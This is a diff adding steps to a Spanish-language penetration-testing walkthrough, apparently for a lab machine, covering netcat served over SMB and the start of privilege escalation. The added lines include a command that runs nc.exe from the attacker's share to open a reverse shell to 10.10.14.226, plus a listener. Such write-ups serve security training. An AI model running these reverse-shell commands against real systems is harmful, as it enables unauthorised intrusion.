@@ -45,4 +45,32 @@ Ahora al acceder a esta *Web Shell* a través del navegador vemos que tenemos la
 ![[Pasted image 20260922100219.png]]
 
 Ahora deberemos de conseguir obtener una *Reverse Shell* a nuestra maquina de atacante.
-Primero deberemos de conseguir una conexion usando [[NETCAT]] desde la maquina victima para poder ejecutar este y entablar una conexión con nuestra maquina.
+Primero deberemos de conseguir una conexión usando [[NETCAT]] desde la maquina victima para poder entablar una conexión con nuestra maquina.
+
+Con el [[NETCAT]] en nuestro directorio de trabajo deberemos de ejecutar un server *SMB* compartiendo esta herramienta a nivel de red con [[SMBSERVER]]
+```shell
+smbserver.py smbFolder $(pwd) 
+```
+
+En la *Web Shell* que hemos obtenido anteriormente deberemos de acceder a este recurso compartido en red y ejecutar el [[NETCAT]]
+```shell
+\\10.10.14.226\smbFolder\nc.exe -e cmd 10.10.14.226 443
+```
+
+Y en nuestra maquina atacante nos pondremos en escucha
+```shell
+rlwrap nc -nlvp 443
+```
+
+Consiguiendo entablar una conexión con la maquina victima
+![[Pasted image 20260922101714.png]]
+
+# Privilege Scalation
+
+Miraremos los privilegios que tiene nuestro usuario
+```shell
+whoami /priv
+```
+
+![[Pasted image 20260922101948.png]]
+
